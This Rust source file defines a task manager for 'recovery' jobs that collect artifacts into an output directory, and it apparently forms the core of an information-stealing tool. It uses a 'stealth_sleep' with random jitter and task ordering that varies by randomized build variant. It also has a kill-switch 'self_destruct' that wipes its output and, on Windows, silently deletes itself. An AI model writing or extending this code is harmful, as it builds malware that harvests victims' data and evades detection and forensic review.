use crate::build_config;
use crate::recovery::context::RecoveryContext;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryError, RecoveryOutcome, RecoveryStatus, RecoveryTask};
use std::sync::Arc;
use std::time::Instant;
use tokio::fs;
use tokio::sync::{OwnedSemaphorePermit, Semaphore};
use tokio::task::JoinSet;
use tracing::{debug, info};

pub struct RecoveryManager {
    context: RecoveryContext,
    tasks: Vec<Arc<dyn RecoveryTask>>,
}

impl RecoveryManager {
    pub fn new(context: RecoveryContext) -> Self {
        Self {
            context,
            tasks: Vec::new(),
        }
    }

    pub fn register_task(&mut self, task: Arc<dyn RecoveryTask>) {
        self.tasks.push(task);
    }

    pub fn register_tasks(&mut self, tasks: Vec<Arc<dyn RecoveryTask>>) {
        self.tasks.extend(tasks);
    }

    #[allow(dead_code)]

    pub async fn run_all(&self) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
        fs::create_dir_all(&self.context.output_dir).await?;
        let semaphore = Arc::new(Semaphore::new(self.context.concurrency_limit));
        let mut join_set = JoinSet::new();
        let control = RecoveryControl::global();
        info!(
            build_variant = %build_config::BUILD_VARIANT.describe(),
            "ordering tasks with randomized build variant"
        );

        let mut ordered_tasks: Vec<(u64, Arc<dyn RecoveryTask>)> = self
            .tasks
            .iter()
            .map(|task| {
                (
                    build_config::task_order_key(&task.label()),
                    Arc::clone(task),
                )
            })
            .collect();
        ordered_tasks.sort_unstable_by_key(|(key, _)| *key);

        for (_, task) in ordered_tasks.into_iter() {
            if !control.allows_category(task.category()) {
                debug!(
                    task=%task.label(),
                    category=?task.category(),
                    "skipping disabled category"
                );
                continue;
            }
            let permit =
                semaphore.clone().acquire_owned().await.map_err(|err| {
                    RecoveryError::Custom(format!("semaphore acquire failed: {err}"))
                })?;
            let task = Arc::clone(&task);
            let ctx = self.context.clone();

            if build_config::BUILD_VARIANT != build_config::BuildVariant::Alpha {
                use crate::recovery::helpers::sleep::stealth_sleep;
                use rand::Rng;
                let jitter = rand::thread_rng().gen_range(50..200);
                stealth_sleep(jitter);
            }

            join_set.spawn(Self::execute_task(task, ctx, permit));
        }

        let mut outcomes = Vec::with_capacity(self.tasks.len());
        while let Some(res) = join_set.join_next().await {
            match res? {
                Ok(outcome) => outcomes.push(outcome),
                Err(RecoveryError::KillSwitchTriggered) => {
                    info!("kill-switch triggered, initiating self-destruct");
                    self.self_destruct();
                }
                Err(err) => return Err(err),
            }
        }

        Self::sort_outcomes(&mut outcomes);
        Ok(outcomes)
    }

    fn self_destruct(&self) -> ! {
        let _ = std::fs::remove_dir_all(&self.context.output_dir);

        #[cfg(target_os = "windows")]
        {
            use crate::recovery::self_delete::perform_silent_delete;
            unsafe {
                let _ = perform_silent_delete();
            }
        }

        std::process::exit(0);
    }

    async fn execute_task(
        task: Arc<dyn RecoveryTask>,
        ctx: RecoveryContext,
        _permit: OwnedSemaphorePermit,
    ) -> Result<RecoveryOutcome, RecoveryError> {
        let label = task.label();
        let category = task.category();
        let start = Instant::now();

        debug!(task=%label, category=%category, "starting recovery task");
        let result = task.run(&ctx).await;

        if let Err(RecoveryError::KillSwitchTriggered) = result {
            return Err(RecoveryError::KillSwitchTriggered);
        }

        let duration = start.elapsed();
        let (status, artifacts, error) = match result {
            Ok(items) if items.is_empty() => (RecoveryStatus::NotFound, items, None),
            Ok(items) => (RecoveryStatus::Success, items, None),
            Err(err) => {
                let description = err.to_string();
                (RecoveryStatus::Failed, Vec::new(), Some(description))
            }
        };

        info!(
            task=%label,
            status=?status,
            artifacts=%artifacts.len(),
            duration=?duration,
            "task completed"
        );

        Ok(RecoveryOutcome {
            task: label,
            category,
            duration,
            status,
            artifacts,
            error,
        })
    }

    fn sort_outcomes(outcomes: &mut [RecoveryOutcome]) {
        match build_config::BUILD_VARIANT {
            build_config::BuildVariant::Alpha => outcomes.sort_by(|a, b| {
                Self::status_rank(a.status)
                    .cmp(&Self::status_rank(b.status))
                    .then_with(|| a.task.cmp(&b.task))
            }),
            build_config::BuildVariant::Beta => {
                outcomes.sort_by(|a, b| a.duration.cmp(&b.duration))
            }
            build_config::BuildVariant::Gamma => outcomes.sort_by(|a, b| a.task.cmp(&b.task)),
            build_config::BuildVariant::Delta => {
                outcomes.sort_by(|a, b| a.category.to_string().cmp(&b.category.to_string()))
            }
        }
    }

    fn status_rank(status: RecoveryStatus) -> u8 {
        match status {
            RecoveryStatus::Success => 0,
            RecoveryStatus::Partial => 1,
            RecoveryStatus::NotFound => 2,
            RecoveryStatus::Failed => 3,
        }
    }
}
